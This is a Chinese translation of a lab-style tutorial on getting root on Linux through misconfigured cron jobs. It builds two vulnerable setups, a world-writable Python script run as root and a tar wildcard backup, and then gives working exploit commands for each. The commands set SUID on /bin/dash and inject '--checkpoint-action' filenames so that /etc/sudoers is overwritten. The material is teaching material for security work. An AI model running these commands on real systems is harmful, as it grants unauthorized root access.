# 利用定时任务（Cron jobs）进行Linux特权升级

阅读量 **120895**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-25 17:00:27

 **x**

##### 译文声明

本文是翻译文章，文章来源：hackingarticles.in

原文地址：<http://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t019ab9dcb60b34cf31.jpg)

在本文中，我们将学习“通过利用Cron jobs实现特权升级”，以获得远程主机的root访问权限，并研究一个糟糕的Cron Job实施如何导致特权升级。

## 什么是Cronjob？

Cron
Jobs被用于通过在服务器上的特定日期和时间执行命令来安排任务。它们最常用于sysadmin任务，如备份或清理/tmp/目录等。Cron这个词来自crontab，它存在于/etc目录中。

例如：在crontab内部，我们可以添加以下条目，以每1小时自动打印一次apache错误日志。

1

|

1 0 * * * printf “” > /var/log/apache/error_log  
  
---|---  
  
## Crontab文件覆写

###  创建一个Cron Job

**目标：** 在crontab的帮助下安排一个新任务，运行一个python脚本，它将删除特定目录中的所有数据。

假设“cleanup”就是每2分钟自动删除一次数据的目录。因此，我在/home/cleanup中保存了一些数据。

1

2

3

4

5

6

7

|

mkdir cleanup

cd cleanup

echo “hello freinds” > 1.txt

echo “ALL files will be deleted in 2 mints” > 2.txt

echo “” > 1.php

echo “” > 2.php

ls  
  
---|---  
  
正如你可以从下图中看到的那样，一些文件存储在cleanup目录中。

现在，在任何其他目录中编写一个python程序，从/home/cleanup中删除数据，并授予其所有权限。

1

2

|

cd /tmp

nano cleanup.py  
  
---|---  
  
1

2

3

4

5

6

7

|

#!/usr/bin/env python

import os

import sys

try:

os.system(‘rm -r /home/cleanup/* ‘)

except:

sys.exit()  
  
---|---  
  
chmod 777 cleanup.py

最后，在crontab的帮助下安排一项任务，每2分钟运行一次cleanup.py。

1

2

|

nano /etc/crontab

*/2 * * * * root /tmp /cleanup.py  
  
---|---  
  
现在，我们来验证一下目标。

1

2

3

4

|

cd /home/cleanup

ls

date

ls  
  
---|---  
  
很好，它正在运行，你可以看到所有文件在2分钟后被删除。

## 实施漏洞利用

启动攻击机器，首先破坏目标系统，然后进入特权提升阶段。假设我通过ssh成功登录到受害者的机器，并访问非root用户终端。执行以下命令，如下所示。

1

2

3

|

cat /etc/crontab

ls –al /tmp/cleanup.py

cat /tmp/cleanup.py  
  
---|---  
  
从上面的步骤中，我们注意到crontab每2分钟运行一次python脚本。

有很多方法可以获得root访问权限，就像在这个方法中我们启用了SUID位/bin/dash。这很简单，首先，通过一些编辑器打开文件。例如，nanocleanup.py。并从下面的行中替换“rm
-r /tmp/*”，如下所示。

1

|

os.system(‘chmod u+s /bin/dash’)  
  
---|---  
  
两分钟后，它将为/bin/dash设置SUID权限。当你运行它时，它将给予root访问权限。

1

2

3

|

/bin/dash

id

whoami  
  
---|---  
  
太棒了！！我们…………………完成了目标。

## Crontab Tar Wildcard注入

###  创建一个Cron Job

**目标：** 在crontab的帮助下安排一个任务，用HTML目录下的tar存档程序进行备份。

这个目录应该具有你想要进行备份的可执行权限。

现在，在crontab的帮助下安排一个任务，运行tar档案程序，以每1分钟备份一次/html文件夹到/var/backups。

1

2

|

nano /etc/crontab

*/1 * * * * root tar –zcf /var/backups/html.tgz /var/www/html/*  
  
---|---  
  
让我们执行以下命令来验证计划是否有效。

1

2

3

|

cd /var/backup

ls

date  
  
---|---  
  
从下图你可以看到，html.tgz文件在1分钟后生成。

## 实施漏洞利用

启动攻击机器，首先破坏目标系统，然后进入特权提升阶段。假设我通过ssh成功登录到受害者的机器，并访问非root用户终端。执行以下命令，如下所示。

**cat / etc / crontab**

在这里，我们注意到目标已经为每一个1分钟安排了一个tar归档程序，并且我们知道cron job作为root运行。让我们试着利用。

执行以下命令将sudo权限授予登录的用户，随后进行wildcard注入。

1

2

3

4

|

echo ‘echo “ignite ALL=(root) NOPASSWD: ALL” > /etc/sudoers’ >test.sh

echo “” > “–checkpoint-action=exec=sh test.sh”

echo “” > —checkpoint=1

tar cf archive.tar *  
  
---|---  
  
现在，1分钟以后，它将向用户授予sudo权限。你可以通过下图来确认这一点。

1

2

3

|

sudo –l

sudo bash

whoami  
  
---|---  
  
很好！我们已经成功地获得了root访问权限。

审核人：yiwang 编辑：边边

本文翻译自hackingarticles.in [原文链接](http://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **圆圈** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/149325](/post/id/149325)

安全客 - 有思想的安全新媒体

本文转载自: [hackingarticles.in](http://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)

如若转载,请注明出处： <http://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [linux](/tag/linux)
  * [技术分析](/tag/技术分析)
  * [Cron jobs](/tag/Cron jobs)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhimg.com/t01a427938cfa1b52e2.png) 圆圈

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

